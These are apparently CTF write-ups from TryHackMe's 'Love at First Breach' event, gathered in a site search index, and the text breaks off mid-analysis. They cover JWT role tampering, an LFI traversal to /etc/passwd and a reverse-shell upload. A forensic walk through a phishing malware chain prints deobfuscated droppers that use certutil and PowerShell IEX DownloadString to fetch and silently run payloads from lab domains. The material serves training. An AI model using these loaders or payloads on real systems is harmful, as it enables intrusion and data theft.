<pre><code>THM{PR3D1CT4BL3_S33D5_BR34K_H34RT5}\n</code></pre> <p>Tools Used <code>ffuf</code> <code>python</code></p> <p>Date completed: 16/02/26 Date published: 21/02/26</p>","tags":["tryhackme","room","medium","offensive","web","crypto","scripting"]},{"location":"tryhackme/love_at_first_breach/speed_chatting/","title":"Speed Chatting","text":"<p>Platform: TryHackMe Type: Room Difficulty: Easy Link: Speed Chatting</p>","tags":["tryhackme","room","easy","offensive","web","unrestricted-file-upload"]},{"location":"tryhackme/love_at_first_breach/speed_chatting/#description","title":"Description","text":"<p>Can you hack as fast as you can chat? </p> <p>\"Days before Valentine's Day, TryHeartMe rushed out a new messaging platform called \"Speed Chatter\", promising instant connections and private conversations. But in the race to beat the holiday deadline, security took a back seat. Rumours are circulating that \"Speed Chatter\" was pushed to production without proper testing.</p> <p>As a security researcher, it's your task to break into \"Speed Chatter\", uncover flaws, and expose TryHeartMe's negligence before the damage becomes irreversible.</p> <p>You can find the web application here: http://MACHINE_IP:5000\"</p>","tags":["tryhackme","room","easy","offensive","web","unrestricted-file-upload"]},{"location":"tryhackme/love_at_first_breach/speed_chatting/#initial-enumeration","title":"Initial Enumeration","text":"<p>Visitng the web page reveals a chatbot with a file upload functionality, apparently so that you can updte your profile picture. Looking at the source code suggests that the profile picture being displayed is atually being source from an external website: </p> <p>The source code also reveals that the destination web application is running Flask (a Python framework) and that the page is refreshed every 3 seconds to get the chat messages. Attempting to upload a reverse shell from PayloadsAllTheThings shows that uploading a <code>.py</code> file is possible. </p> <p>I set up a local <code>nc</code> listener prior to uploading the shell (remember, the page automatically refreshes every 3 seconds - this includes the loading of the file allocated to the profile for the profile image), removed the <code>python -c</code> prefix from a reverse shell from PayloadsAllTheThings (because that prefix is specific to executing the reverse shell from a command line, not from within a self-contained .py file) and got a connection back to my attacking machine. From there, getting the flag was trivial: </p> What is the flag? <pre><code>THM{R3v3rs3_Sh3ll_L0v3_C0nn3ct10ns}\n</code></pre> <p>Tools Used <code>nc</code></p> <p>Date completed: 14/02/26 Date published: 17/02/26</p>","tags":["tryhackme","room","easy","offensive","web","unrestricted-file-upload"]},{"location":"tryhackme/love_at_first_breach/tryheartme/","title":"TryHeartMe","text":"<p>Platform: TryHackMe Type: Room Difficulty: Easy Link: TryHeartMe</p>","tags":["tryhackme","room","easy","offensive","web","jwt"]},{"location":"tryhackme/love_at_first_breach/tryheartme/#description","title":"Description","text":"<p>Access the hidden item in this Valentine's gift shop. </p> <p>\"The TryHeartMe shop is open for business. Can you find a way to purchase the hidden \u201cValenflag\u201d item?  You can access the web app here: http://MACHINE_IP:5000\"</p>","tags":["tryhackme","room","easy","offensive","web","jwt"]},{"location":"tryhackme/love_at_first_breach/tryheartme/#enumeration","title":"Enumeration","text":"<p>Given the challenge description, I went straight in for website enumeration. I used my go-to <code>ffuf</code> command to enumerate the website: <code>ffuf -u http://TARGET_IP_ADDRESS/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -ic -c</code>. Nothing much interesting here (not yet anyway): </p> <p>After looking around the site, checking for <code>robots.txt</code>, and examining the source code, I concluded there were no low hanging fruits to be had and decided to move into gaining an account using the \"Register\" link at the top of the page.</p>","tags":["tryhackme","room","easy","offensive","web","jwt"]},{"location":"tryhackme/love_at_first_breach/tryheartme/#foothold","title":"Foothold","text":"<p>Using a fake email address (<code>test@test.com:password</code>) to gain an account was trivial, and as soon as I logged in I was supplied with a site cookie. The name of the cookie suggested it was a JWT token: </p> <p>Using an online JWT decoder showed the token value was able to be decoded and furthermore had a user role assigned: </p> <p>Using the same online tool, I moved to the encoding function and changed the user role from \"user\" to \"admin\" before copying the encoded value and pasting it into the cookie value on the site (using Developer Tools). Refreshing the page after doing this resulted in a new \"Admin\" button being made available: </p> <p>Navigating to this admin area reveals the hidden shop item that we are looking for: </p> <p>Clicking \"Open Valenflag\" and then \"Buy\" revealed the flag: </p> What is the flag? <pre><code>THM{v4l3nt1n3_jwt_c00k13_t4mp3r_4dm1n_sh0p}\n</code></pre> <p>Tools Used JWT decoder</p> <p>Date completed: 14/02.26 Date published: 17/02/26</p>","tags":["tryhackme","room","easy","offensive","web","jwt"]},{"location":"tryhackme/love_at_first_breach/valenfind/","title":"Valenfind","text":"<p>Platform: TryHackMe Type: Room Difficulty: Medium Link: Valenfind</p>","tags":["tryhackme","room","easy","offensive","web","lfi"]},{"location":"tryhackme/love_at_first_breach/valenfind/#description","title":"Description","text":"<p>Can you find vulnerabilities in this new dating app?</p> <p>\"There\u2019s this new dating app called \u201cValenfind\u201d that just popped up out of nowhere. I hear the creator only learned to code this year; surely this must be vibe-coded. Can you exploit it?</p> <p>You can access it here: http://MACHINE_IP:5000\"</p>","tags":["tryhackme","room","easy","offensive","web","lfi"]},{"location":"tryhackme/love_at_first_breach/valenfind/#initial-enumeration","title":"Initial Enumeration","text":"<p>Given the challenge description, I went straight in for website enumeration. I used my go-to <code>ffuf</code> command to enumerate the website: <code>ffuf -u http://TARGET_IP_ADDRESS/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -ic -c</code>. Nothing that I didn't already know about here (having already visited the site in a web browser): </p> <p>Inspection of the source code for the discovered pages didn't turn up anything useful and there was no <code>robots.txt</code> file. As a final initial enumeration step, I ran an <code>nmap</code> service scan against the port to check versioning but there didn't appear to be anything useful for exploitation here either, though it did confirm that the web application was a Flask implementation.</p>","tags":["tryhackme","room","easy","offensive","web","lfi"]},{"location":"tryhackme/love_at_first_breach/valenfind/#foothold","title":"Foothold","text":"<p>With no clue of any username or password, I decided to test the register function first. Registering a fake account was successful, directing me to a page to complete my profile after which I was redirected to a Dashboard with links to the profiles of other users. Browsing through the profiles, Cupid's bio held something interesting: </p> <p>Checking the source code for the profile page disclosed something pretty major: </p>","tags":["tryhackme","room","easy","offensive","web","lfi"]},{"location":"tryhackme/love_at_first_breach/valenfind/#lfi-exploitation","title":"LFI exploitation","text":"<p>With Burp running as a proxy, I sent a request to the web application to change the theme, capturing the request in the HTTP history, which was then sent to Burp Repeater. Changing the parameter value to something basic (I used <code>flag.txt</code> just in case it was going to be that simple!) reveals the absolute file path that I was working in: </p> <p>Updating the payload to <code>../../../../etc/passwd</code> successfully returned the <code>/etc/passwd</code> file, proving the LFI vulnerability: </p> <p>Knowing that the application is a Flask application (from the <code>nmap</code> scan), we can suppose that there may be an <code>app.py</code> file in the main web directory, which (thanks to Burp Repeater) we know to be <code>/opt/Valenfind</code>. Using the payload <code>../../../../opt/Valenfind/app.py</code> (this can be trimmed, but keeps it neat in case we need to keep testing for other files) in Burp Repeater, I got the full contents of the <code>app.py</code> file. There were a couple of useful nuggets of information in here:  </p> <ul> <li>There is an <code>ADMIN_API_KEY</code> variable with the contents <code>CUPID_MASTER_KEY_2024_XOXO</code>.</li> <li>There is a hidden endpoint of <code>/api/admin/export_db</code> which requires an <code>auth_header</code> entitled <code>X-Valentine-Token</code> with the value of the <code>ADMIN_API_KEY</code> variable.</li> </ul> <p>With these things in mind, I navigated to the newly discovered endpoint (which, unsurprisingly, returned a <code>403</code> error) to capture the request in Burp and sent it to Repeater. I added the expected authorization header to the bottom of the request and was rewarded with the contents of the database file: </p> <p>Hidden in amongst the database contents is our flag: </p> What is the flag? <pre><code>THM{v1be_c0ding_1s_n0t_my_cup_0f_t3a}\n</code></pre> <p>Tools Used <code>burp</code></p> <p>Date completed: 15/02/26 Date published: 17/02/26</p>","tags":["tryhackme","room","easy","offensive","web","lfi"]},{"location":"tryhackme/love_at_first_breach/advanced_track/","title":"Love at First Breach 2026 - Advanced Track","text":"<p>The Advanced Track room was made up of six main tasks:  </p> <ol> <li>LOVELETTER.exe </li> <li>CupidCards - coming soon!  </li> <li>St3alMyH34rt - coming soon!  </li> <li>Chains of Love - coming soon!  </li> <li>Cloud Nine - coming soon!  </li> <li>Swiper - coming soon!</li> </ol>"},{"location":"tryhackme/love_at_first_breach/advanced_track/task_1_loveletter.exe/","title":"Love at First Breach 2026 - Advanced Track - LOVELETTER","text":"<p>Platform: TryHackMe Type: CTF  Difficulty: Hard Link: Love at First Breach 2026 - Advanced Track (Task 2)</p>","tags":["tryhackme","ctf","easy","defensive","forensics","binary-analysis","scripting"]},{"location":"tryhackme/love_at_first_breach/advanced_track/task_1_loveletter.exe/#description","title":"Description","text":"<p>\"This Valentine's Day, an employee at Cupid Corp received a heartfelt e-card from a secret admirer, but romance wasn't the only thing in the air. Initial findings reveal that multiple attacker-controlled domains are tied to the campaign, each serving a distinct role in a highly sophisticated, multi-stage payload delivery chain.</p> <p>The threat actor behind this operation appears to be exceptionally meticulous, with infrastructure configured to serve payloads only to genuine targets, specifically Windows users, effectively staying under the radar of automated analysis tools and casual investigation. However, it was eventually discovered that this specific campaign points all domains to MACHINE_IP.</p> <p>Your mission: Trace the full attack chain, reverse-engineer the payloads, and recover the stolen data before the trail goes cold.</p> <p>To get started, investigate the email in this archive to identify the infection's origin.</p> <p>Zip password: happyvalentines\"</p>","tags":["tryhackme","ctf","easy","defensive","forensics","binary-analysis","scripting"]},{"location":"tryhackme/love_at_first_breach/advanced_track/task_1_loveletter.exe/#environment-and-artefacts-provided","title":"Environment and Artefacts provided","text":"<p>THM target machine (live) Suspected phishing email (.eml file)</p>","tags":["tryhackme","ctf","easy","defensive","forensics","binary-analysis","scripting"]},{"location":"tryhackme/love_at_first_breach/advanced_track/task_1_loveletter.exe/#phishing-email-analysis","title":"Phishing email (analysis)","text":"<p>I examined the contents of the email in two ways:  </p> <ul> <li>In its graphical format with Thunderbird.</li> <li>Reading the plaintext with <code>cat</code>.</li> </ul> <p>The graphical representation shows an email from a company to inform the recipient of an alleged Valentine's Day card. The company name could be \"Valentine's Day E-Cards\", \"Valentine's E-Card Service\", or \"Valentine E-Cards\" - these can be seen in the header and footer. The sender address appears to be noreply@e-cards.valentine.local. It is not personalised (addressed as \"Dear friend\") and originates from a \"Secret Admirer\". There is a feeling of urgency - the card allegedly disappears after 7 days. The e-mail contains three links:  </p> <ul> <li>A link to \"Open Your Valentine\" (http://delivery.cupidsarrow.thm/card.html).  </li> <li>A link to contact support at the company (support@e-cards.valentine.local).</li> <li>An unsubscribe link (http://delivery.cupidsarrow.thm/unsubscribe).</li> </ul> <p>The CLI text analysis of the raw email content does not appear to contain any conflicting information to what was found during graphical analysis.</p>","tags":["tryhackme","ctf","easy","defensive","forensics","binary-analysis","scripting"]},{"location":"tryhackme/love_at_first_breach/advanced_track/task_1_loveletter.exe/#live-machine-enumeration","title":"Live machine (enumeration)","text":"<p>Given the findings from the email analysis, I firstly added both <code>cupidsarrow.thm</code> and <code>delivery.cupidsarrow.thm</code> with the provided machine's IP address to the <code>/etc/host</code> file. Both the raw IP address and flat <code>cupidsarrow</code> domain returned the same page in an internet browser. Attempting to navigate to the <code>delivery</code> subdomain resulted in a customised <code>404</code> error - I got the same result for the URL that supposedly contained the Valentine's Message and the <code>unsubscribe</code> link from the e-mail. There was no <code>robots.txt</code> file and the source code didn't contain anything useful.</p> <p>Before furthering the web enumeration, I went back to basics. I generated a list of open ports for more comprehensive enumeration with the following: <code>ports=$(nmap -p- --min-rate=1000 TARGET_IP_ADDRESS | grep ^[0-9] | cut -d '/' -f 1 | tr '\\n' ',' | sed s/,$//)</code> This revealed the following open ports:</p> <ul> <li>22</li> <li>80</li> <li>8080  </li> </ul> <p>I ran a full <code>nmap</code> scan to query the services for version information, as well as querying the target system for OS information with <code>nmap -p$ports -A -T4 TARGET_IP_ADDRESS</code>, which revealed the following: </p> <p>Navigating to the page at port 8080 (as found in the <code>nmap</code> scan) resulted in a <code>401</code> JSON response. The <code>nmap</code> scan told me the request is being refused because of a missing <code>WWW-Authenticate</code> header, but without knowing the expected values, I can't do much with this. There's a good article about this header in the Mozilla Developers documentation.</p> <p>I used my go-to <code>ffuf</code> command to enumerate the website at port 80: <code>ffuf -u http://TARGET_IP_ADDRESS/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -ic -c</code></p> <p>Nothing interesting there: </p> <p>I followed that up with a scan of the 8080 port. Nothing useful here either: </p> <p>Knowing that there's a subdomain in play, I decided to try a DNS zone transfer with <code>dig</code> to see if there were others, but this was rejected. I moved on to enumeration with <code>gobuster</code> but the errors started piling up within the first few attempts, so I figured this was likely throttling as per the challenge description. Finally, I tried a <code>vhost</code> scan with <code>gobuster</code> as an alternative, but got no results here either (with both the 80 and 8080 ports). I did a recursive directory enumeration on the main site and found a JS endpoint at <code>javascript/jquery/jquery</code> but this appeared to be a standard jquery library (at least according tto ChatGPT - I had to ask it very forcefully to read the file properly, it was trying to be very lazy).</p> <p>I ran an <code>nmap</code> UDP scan but the only open port I found was DHCP, which I suspected was open out of lab necessity rather than as an exploitable attack path.</p> <p>I also ran a couple more recursive <code>ffuf</code> scans with two alternative word lists (a larger one and a smaller one with common words), but nothing there either.</p> <p>I ran an <code>nmap</code> vulnerability scan, which reported that there were two possible vulnerabilities that might be exploitable, but one of them was a DOS so not of interest in a CTF. The other sounded promising - an HTTP verb tampering attack that might achieve an authentication bypass, but when I sent an OPTIONS request with <code>nc</code>, the only accepted methods were reported as <code>HEAD</code>, <code>GET</code>, and <code>OPTIONS</code>. The first and second both returned <code>401</code> errors.</p> <p>I did a quick round of research for the following software versions identified in the <code>nmap</code> scans but came up empty:  </p> <ul> <li>OpenSSH 8.9p1  </li> <li>Apache httpd 2.4.52  </li> <li>Werkzeug httpd 3.1.5  </li> <li>Linux 4.15 - 5.19  </li> </ul> <p>Considering the challenge specifically (and pointedly) mentions Windows hosts, I also looked at whether the decompressed email file had an alternative data stream with PowerShell (<code>Get-Item &lt;fileName&gt; -Stream *</code>) but no joy there. This step did however make me think - if the payload is specifically targeting Windows users, could it be that there is a user-agent check being used by the web app that would refuse or grant access to the <code>card.html</code> link contained in the original e-mail? I fired up Burp, redirected the traffic in my browser with FoxyProxy, and sent the request to Repeater. I'm using Firefox on my attack box so in theory all I needed to do is change the user-agent value so that the request appears to be coming from a Windows device. A list of valid user agents can be found here. Replacing the Linux value with a Windows value in the Repeater request returned different responses - <code>403</code> for the <code>delivery</code> subdomain, <code>400</code> for the <code>card.html</code> and <code>unsubscribe</code> endpoints. Thinking that perhaps this was an issue with the way that requests are rendered within Burp, I went back to the browser to see if I could force a change of user-agent there.</p> <p>In the Web Developer tools of the browser, there is a inbuilt tool for testing how a web page will appear on particular devices - it's called Responsive Mode: </p> <p>Using this mode, a menu appears at the top of the browser, allowing you to emulate browsing web pages from specific devices. By choosing any device with a Windows OS and reloading the <code>card.html</code> page, I finally got access to something that looked useful (the <code>delivery</code> and <code>unsubscribe</code> endpoints still returned a <code>404</code> error): </p> <p>Downloading the file delivered a file called <code>LOVE_LETTER.pdf.iso</code> to my attacker machine. Whilst I was here, I also checked the source code, which revealed a JS script on the remote machine (<code>valentine-animations.js</code>). Looking at the contents, it was clear it was heavily obfuscated, which seemed out of context for a simple animation element for a web page. I saved it off for possible further exploration.</p>","tags":["tryhackme","ctf","easy","defensive","forensics","binary-analysis","scripting"]},{"location":"tryhackme/love_at_first_breach/advanced_track/task_1_loveletter.exe/#valentine-animationsjs-discovered-script-analysis","title":"valentine-animations.js discovered script (analysis)","text":"<p>The file can be divided into three main sections:  </p> <ul> <li>A header section -  sets some variables, clearly obfuscating the word \"debugger\".  </li> <li>A \"payload\" section - clearly heavily obfuscated.  </li> <li>Genuine code required for rendering the webpage it was hosted on, containing nothing of interest.</li> </ul> <p>The obfuscated \"payload\" actually consists of a Base64-encoded string consisting of the repeated word \u201cVALENTINE\u201d (<code>VkFMRU5USU5F</code>). After decoding, the script XORs the data with a repeating key (\u201cVALENTINE\u201d - set in the <code>_k</code> variable as ASCII characters: <code>[86,65,76,69,78,84,73,78,69]</code>), producing an array of null bytes. These bytes are packaged into a Blob and automatically downloaded. </p> <p>No additional malicious functionality is present in this script - the \"payload\" and obfuscated debugger reference may be present as decoys for the genuine payload somewhere else.</p>","tags":["tryhackme","ctf","easy","defensive","forensics","binary-analysis","scripting"]},{"location":"tryhackme/love_at_first_breach/advanced_track/task_1_loveletter.exe/#love_letterpdfiso-downloaded-file-analysis","title":"LOVE_LETTER.pdf.iso downloaded file (analysis)","text":"<p>Running <code>file</code> on the downloaded file revealed that it was in fact a .iso compressed image: </p> <p>Opening that with the inbuilt Archive Manager utility on Kali revealed a Windows shortcut file: </p> <p>Extracting that and running <code>file</code> again provided some useful information: </p> <p>Using <code>exiftool</code> to examine the .lnk file provides some information about what the shortcut is likely to do: </p> <p>Breaking this output down, it appears that clicking this shortcut would do the following:  </p> <ul> <li>Opens a hidden/minimised command prompt window.  </li> <li>Sets the working directory for the command prompt as C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\2.  </li> <li>Runs a command into the command prompt window, launching a <code>mshta</code> instance with the target <code>http://ecard.rosesforyou.thm/love.hta</code>, then exits (this is the <code>/C</code> switch).  </li> </ul> <p>The purpose of the shortcut is hidden by the name of the shortcut \"Valentine's Day Love Letter\", with the actions being performed by the shortcut deliberately hidden with the <code>Show Minimized</code> option. The working directory is placed in an obscure directory on the local machine, which could conceivably be used as a staging area for legitimate applications. Furthermore, the command being copied into the command prompt is obfuscated by the use of excessive whitespace, string-splitting (with the <code>^</code> character), and the use of variables.</p> <p>The Mshta technique for dropping malicious payloads on victim machines is well documented. I used the Red Canary report to help me understand the attack flow. In this instance I think it likely that it will be used the \"paste and run\" technique to download an apparent payload from the <code>love.hta</code> endpoint, a technique that would go undetected as the Mshta binary is signed and trusted by Windows (referred to as a \"Living-off-the-Land Binary\", or LOLBIN).</p> <p>After adding the new domain to the <code>/etc/hosts</code> file, navigating to the URL contained within the .lnk file resulted in the same customised <code>404</code> error I had been seeing with the site from the beginning of the challenge. Remembering the techniques used to hide the malicious files earlier on, I wondered whether it might only be obtainable if contacted by the Mshta tool. A quick Google gave me a user-agent string I could use with the Responsive Design Mode in Firefox (<code>Mozilla/5.0 (Windows NT 10.0; Win64; x64; Trident/7.0; rv:11.0) like Gecko</code>): </p> <p>After setting the custom UA string, I refreshed the page and the <code>love.hta</code> file downloaded to my attacker machine automatically.</p>","tags":["tryhackme","ctf","easy","defensive","forensics","binary-analysis","scripting"]},{"location":"tryhackme/love_at_first_breach/advanced_track/task_1_loveletter.exe/#lovehta-downloaded-file-analysis","title":"love.hta downloaded file (analysis)","text":"<p>Running <code>file</code> on this new file showed that it was, as expected, a .hta file, readable as ASCII: </p> <p>Reading the file with <code>cat</code> showed it was, once again, heavily obfuscated, though this time I was looking at a VBScript. Intent masquerading is continued with the use of the title \"Valentine\". The program would be launched in a hidden/minimised state. The obfuscation is achieved by building the payload, character by character, using ASCII character representation. After deobfuscation (this can be done in a number of ways, I used AI for speed), the content of the file is as follows: <pre><code>Set shell = CreateObject(\"WScript.Shell\")\nSet fso = CreateObject(\"Scripting.FileSystemObject\")\n\ntemp = fso.GetSpecialFolder(2).Path\nworkDir = temp &amp; \"\\valentine\"\n\nIf Not fso.FolderExists(workDir) Then\n    fso.CreateFolder(workDir)\nEnd If\n\nurl = \"http://gifts.bemyvalentine.thm/bthprops.cpl\"\n\ncmd = \"certutil -urlcache -split -f \" &amp; url &amp; \" \" &amp; workDir &amp; \"\\bthprops.cpl\"\nshell.Run cmd, 0, True\n\nsystemRoot = shell.ExpandEnvironmentStrings(\"%SYSTEMROOT%\")\n\nfso.CopyFile systemRoot &amp; \"\\System32\\fsquirt.exe\", workDir &amp; \"\\fsquirt.exe\", True\n\nshell.Run workDir &amp; \"\\fsquirt.exe\", 0, False\n</code></pre></p> <p>The script, when executed, would do the following:  </p> <ul> <li>Creates a new shell object, for executing commands.</li> <li>Creates a new file system object, for manipulating files and folders.</li> <li>Sets the <code>temp</code> variable as the <code>%TEMP%</code> directory (this is the <code>GetSpecialFolder</code> part).  </li> <li>Sets the working directory variable to be a subdirectory of the <code>%TEMP%</code> directory, named <code>valentine</code>.</li> <li>Creates that <code>valentine</code> if it doesn't already exist.</li> <li>Sets a target url variable for a control panel file (<code>.cpl</code> file extension) from previously unseen domain (<code>gifts.bemyvalentine.thm</code>).</li> <li>Sets a command variable - the command set downloads the .cpl file from the previous step to the working directory.</li> <li>Sets a new systemRoot variable as the value of the <code>%SYSTEMROOT%</code> variable on the target system.</li> <li>Copies the <code>fsquirt</code> executable on the target machine from the <code>%SYSTEMROOT%</code> directory to the working directory of the script.</li> <li>Runs the copied <code>fsquirt</code> executable. </li> </ul> <p>Downloading the .cpl file with <code>certutil</code> ensures the resulting download is trusted by Windows (LOLBIN technique again). Furthermore, using the <code>fsquirt</code> executable, a native Windows binary, as part of the attack chain once again ensures that Windows trusts its execution. In order to put these pieces of the puzzle together, I needed to find out what that .cpl file was. As with the previous file downloads (and after adding the new subdomain to the <code>/etc/hosts</code> file), navigating to the page in the VBScript returned the same customised <code>404</code> file. Knowing that the web application is expecting the file to be downloaded with <code>certutil</code>, I turned to Google again to see if there was a new user-agent string I could use. I found one pretty quickly: <code>CertUtil URL Agent</code>. I used Developer Tools again to update the custom user-agent string, refreshed the page, and once again the file downloaded as expected.</p>","tags":["tryhackme","ctf","easy","defensive","forensics","binary-analysis","scripting"]},{"location":"tryhackme/love_at_first_breach/advanced_track/task_1_loveletter.exe/#bthpropscpl-downloaded-file-analysis","title":"bthprops.cpl downloaded file (analysis)","text":"<p>Running <code>file</code> on the .cpl file suggested it was actually a DLL file: </p> <p>With this information, it became evident that the previous VBScript was executing a DLL sideloading attack - having a legitimate Windows binary load an attacker DLL file.</p> <p>Windows executable files can be examined in detail using Ghidra, so I went ahead and created a new proect, importing the DLL into the CodeBrowser. After Ghidra did its magic (analysis and decompilation), I went about looking for the <code>main</code> function. Because this is a DLL file, I was specifically looking for a <code>DllMain</code> function. Lucky for me, there's one here: </p> <p>Unlucky for me, it simply contains a reference to a function elsewhere, <code>_p</code>: </p> <p>Loading up the <code>_p</code> is a bit more fruitful, but it's pretty obvious it relies heavily on another function, <code>_d</code>: </p> <p>Finally, we get to some content that might be usable in the <code>_d</code> function: </p> <p>So not being great at reverse engineering, at this point I turned to AI to help me understand what was going on. If I understand the explanation correctly, that <code>_d</code> function is effectively a decode function, using a transforming XOR key. The key can be seen in the function as <code>)</code> but is in fact the ASCII representation of the number \"41\". The decode is applied to individual characters (it's actually per byte, but for the purposes of this function, that's characters), taking their index position and multiplying it by 41. It takes that multiplied value and uses it to XOR the original value. Finally it takes that resulting value and XORs it by 0x4c. The middle section of this function is what makes this a transforming key - each character has its own primary XOR key dependant on its position in the full string that is being decoded.</p> <p>That all sounds pretty complicated to me! The good thing is that XOR operations are entirely reversible. What's more, if I go back to the <code>_p</code> function, we can see the memory locations that provide the characters to be decoded, which means we can decode the string ingrained into the program. I asked AI to generate a script that would do this for me, and this is what it came up with (which does work!): <pre><code>def decode_hex_string(hex_input):\n    # remove spaces and convert to bytes\n    hex_input = hex_input.replace(\" \", \"\").strip()\n    data = bytes.fromhex(hex_input)\n\n    decoded = bytearray()\n\n    for i, b in enumerate(data):\n        decoded_byte = b ^ ((i * 41) &amp; 0xFF) ^ 0x4C\n        decoded.append(decoded_byte)\n\n    return decoded\n\n\nif __name__ == \"__main__\":\n    s = input(\"Enter hex string: \")\n    result = decode_hex_string(s)\n\n    print(\"\\nDecoded bytes:\", result)\n    try:\n        print(\"Decoded text :\", result.decode(\"utf-8\"))\n    except:\n        print(\"Decoded text (latin1):\", result.decode(\"latin1\"))\n</code></pre></p> <p>So now all I have to do is get the hex values out of their memory locations, which can be done using the Bytes window and a special copy function (Copy \"Byte String\"). Using that script I was able to extract the following command from the program: <code>powershell -w hidden -ep bypass -nop -c powershell IEX New-Object Net.WebClient DownloadString http://loader.sweethearts.thm/cupid.ps1</code> </p> <p>So in essence, this opens PowerShell in a hidden window, sets the execution policy to bypass (this allows unsigned scripts to be run in the current scope). It goes on to invoke a PowerShell command in that window to create a new web client object to download a script at the given location.</p> <p>Given this script was intended to be downloaded by a command line tool, I used <code>curl</code> to download it (after adding that new domain to the <code>/etc/hosts</code> file of course).</p>","tags":["tryhackme","ctf","easy","defensive","forensics","binary-analysis","scripting"]},{"location":"tryhackme/love_at_first_breach/advanced_track/task_1_loveletter.exe/#cupidps1-downloaded-file-analysis","title":"cupid.ps1 downloaded file (analysis)","text":"<p>As with the other files, I ran <code>file</code> to see what it was. Looks like a readable ASCII file: </p> <p>Surprise, surprise, it was obfuscated, partly through string splitting, partly through hex-encoding at the character level. Given the mix of techniques being applied, I once again turned to AI to perform the deobfuscation task for me. The resulting script performed the following sequence of functions:  </p> <ul> <li>Check for common running debuggers, like Process Monitor and Wireshark. If one is found, a flag is set (this flag is actually not referred to for the rest of the script - usually this would be used to terminate the process to avoid detection).</li> <li>Starts a short sleep timer of 2 seconds - this is usually used to evade sandbox environments.</li> <li>Constructs a URL to download another payload from - <code>http://cdn.loveletters.thm/roses.jpg</code>.</li> <li>Sets a payload marker variable of <code>&lt;!--VALENTINE_PAYLOAD_START--&gt;</code>.</li> <li>Looks inside the extracted byte values from the downloaded file for the payload marker.</li> <li>XOR decrypts the bytes following the payload marker with the key \"ROSES\".  </li> <li>Base64 decodes the resulting XOR'd value.</li> <li>Saves the resulting data to <code>$temp\\valentine.vbs</code>.  </li> <li>Silently executes the downloaded paylad with <code>cscript</code>.</li> </ul> <p>Given this script was intended to be downloaded by a command line tool, I used <code>curl</code> to download it (after adding that new domain to the <code>/etc/hosts</code> file of course).</p>","tags":["tryhackme","ctf","easy","defensive","forensics","binary-analysis","scripting"]},{"location":"tryhackme/love_at_first_breach/advanced_track/task_1_loveletter.exe/#rosesjpg-downloaded-file-analysis","title":"roses.jpg downloaded file (analysis)","text":"<p>As with the other files, I ran <code>file</code> to see what it was. Looks like an image file like it claims: </p> <p>If the PowerShell script is to be believed, it should be possible to extract the payload from this downloaded file using the script's functionality as a guide. As with the previous tasks in this challenge, I asked AI to generate a script for me, and this is what I got back (functioning): <pre><code>import base64\n\nMARKER = b\"&lt;!--VALENTINE_PAYLOAD_START--&gt;\"\nXOR_KEY = b\"ROSES\"\n\nINPUT_FILE = \"roses.jpg\"\nOUTPUT_FILE = \"valentine_decoded.vbs\"\n\n\ndef xor_decrypt(data, key):\n    out = bytearray()\n    for i, b in enumerate(data):\n        out.append(b ^ key[i % len(key)])\n    return bytes(out)\n\n\ndef main():\n    print(\"[*] Reading file...\")\n    with open(INPUT_FILE, \"rb\") as f:\n        content = f.read()\n\n    print(\"[*] Searching for payload marker...\")\n    pos = content.find(MARKER)\n\n    if pos == -1:\n        print(\"[!] Marker not found\")\n        return\n\n    print(f\"[+] Marker found at offset {pos}\")\n\n    # extract everything after marker\n    payload = content[pos + len(MARKER):]\n\n    # strip trailing junk (common in these CTF files)\n    payload = payload.strip()\n\n    print(\"[*] XOR decrypting...\")\n    decrypted = xor_decrypt(payload, XOR_KEY)\n\n    print(\"[*] Base64 decoding...\")\n    try:\n        final = base64.b64decode(decrypted)\n    except Exception as e:\n        print(\"[!] Base64 decode failed:\", e)\n        return\n\n    print(\"[*] Writing decoded VBScript...\")\n    with open(OUTPUT_FILE, \"wb\") as f:\n        f.write(final)\n\n    print(f\"[+] Done! Output saved to: {OUTPUT_FILE}\")\n\n\nif __name__ == \"__main__\":\n    main()\n</code></pre></p> <p>I ended up with another .vbs script saved on my attacker machine, ready for further analysis.</p>","tags":["tryhackme","ctf","easy","defensive","forensics","binary-analysis","scripting"]},{"location":"tryhackme/love_at_first_breach/advanced_track/task_1_loveletter.exe/#valentinevbs-extracted-file-analysis","title":"valentine.vbs extracted file (analysis)","text":"<p>As with the other files, I ran <code>file</code> to see what it was. Looks like a readable ASCII file: </p> <p>Aaaaaaand obfuscated. I know I shouldn't be surprised, but for for a single challenge in a larger CTF, this is getting a little tedious. Back to AI I went for deobfuscation magic, and this is the result: <pre><code>Dim fso, ws, dp, xh, sa\n\nSet fso = CreateObject(\"Scripting.FileSystemObject\")\nSet ws = CreateObject(\"WScript.Shell\")\n\ndp = fso.GetSpecialFolder(2).Path &amp; \"\\heartbeat.exe\"\n\nSet xh = CreateObject(\"MSXML2.XMLHTTP\")\nxh.Open \"GET\", \"http://cdn.loveletters.thm/heartbeat.exe\", False\nxh.Send\n\nIf xh.Status = 200 Then\n    Set sa = CreateObject(\"ADODB.Stream\")\n    sa.Type = 1\n    sa.Open\n    sa.Write xh.responseBody\n    sa.SaveToFile dp, 2\n    sa.Close\n    Set sa = Nothing\nEnd If\n\nSet xh = Nothing\n\nws.Run \"cmd /c start \"\" \"\"\" &amp; dp &amp; \"\"\"\", 0, False\n</code></pre></p> <p>So put simply, this script creates a shell object to download an executable folder called <code>heartbeat.exe</code> from another new domain (yes, this was added to my <code>/etc/hosts</code> file), saves it to the local <code>%TEMP%</code> folder as the raw binary output, then executes it silently. As with the other files, I used <code>curl</code> to get hold of the file.</p>","tags":["tryhackme","ctf","easy","defensive","forensics","binary-analysis","scripting"]},{"location":"tryhackme/love_at_first_breach/advanced_track/task_1_loveletter.exe/#heartbeatexe-downloaded-file-analysis","title":"heartbeat.exe downloaded file (analysis)","text":"<p>As with the other files, I ran <code>file</code> to see what it was. Looks like a Windows executable file, just like it claims to be: </p> <p>I used Ghidra again to examine the contents of this new executable file. The <code>main</code> function is pretty simple - it displays a message to the screen, calls on another function to build an authorization header, calls a function to exfiltrate files from the file system, and finally calls another function to display a ransom note. With that in mind, I started to look at the component functions, which actually had very helpful names.</p> <p><code>build_auth_header</code> After printing three lines of text to the screen, this is the first function to be called. Firstly it builds a string object - at first glance this appears to consist of a colon and the string <code>cupid_agent</code>. The string agent is then base64 encoded and added to a further string to construct the authorization header. 